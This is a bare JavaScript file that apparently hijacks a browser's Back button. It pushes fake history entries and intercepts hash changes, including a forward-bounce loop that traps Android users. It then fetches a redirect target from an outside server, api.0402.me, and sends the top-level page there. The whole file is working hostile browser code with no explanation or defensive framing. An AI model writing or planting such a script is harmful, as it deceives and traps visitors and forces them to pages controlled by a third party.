(function()
{
    history.pushState(history.length + 1, "message", window.location.href.split('#')[0] + "#" + (new Date).getTime());
    if (navigator.userAgent.indexOf('Android') != -1)
    {
        if (typeof(tbsJs) != "undefined")
        {
            tbsJs.onReady('{useCachedApi : "true"}', function(e){});
            window.onhashchange = function()
            {
                getandjump()
            }
        }
        else
        {
            var pop = 0;
            window.onhashchange = function(event)
            {
                pop++;
                if (pop >= 3)
                {
                    getandjump()
                }
                else
                {
                    history.go(1)
                }
            };
            history.go(-1)
        }
    }
    else
    {
        window.onhashchange = function()
        {
            getandjump()
        }
    }
    function get(url, fn)
    {
        var xhr = new XMLHttpRequest;
        xhr.open('GET', url, false);
        xhr.onreadystatechange = function()
        {
            if (xhr.readyState == 4 && xhr.status == 200 || xhr.status == 304)
            {
                fn.call(this, xhr.responseText)
            }
        };
        xhr.send()
    }
    var g = document.currentScript.src.split(".js")[1];
    var backUrl;
    function getandjump()
    {
        if (backUrl)
        {
            jump()
        }
        else
        {
            get('https://api.0402.me/task/getUrl' + g, function(res)
            {
                res = JSON.parse(res);
                backUrl = res.jump;
                jump()
            })
        }
    }
    function jump()
    {
        top.location.href = backUrl
    }
})();